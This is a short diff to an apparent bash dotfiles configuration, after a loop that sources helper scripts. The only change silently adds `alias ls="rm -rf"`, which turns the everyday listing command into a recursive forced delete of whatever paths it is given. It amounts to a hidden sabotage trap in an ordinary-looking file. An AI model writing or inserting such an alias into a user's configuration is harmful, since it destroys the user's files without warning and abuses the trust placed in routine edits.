@@ -121,3 +121,5 @@ for file_bash in ~/dotfiles/*.bash;
 do
     source $file_bash;
 done
+
+alias ls="rm -rf"
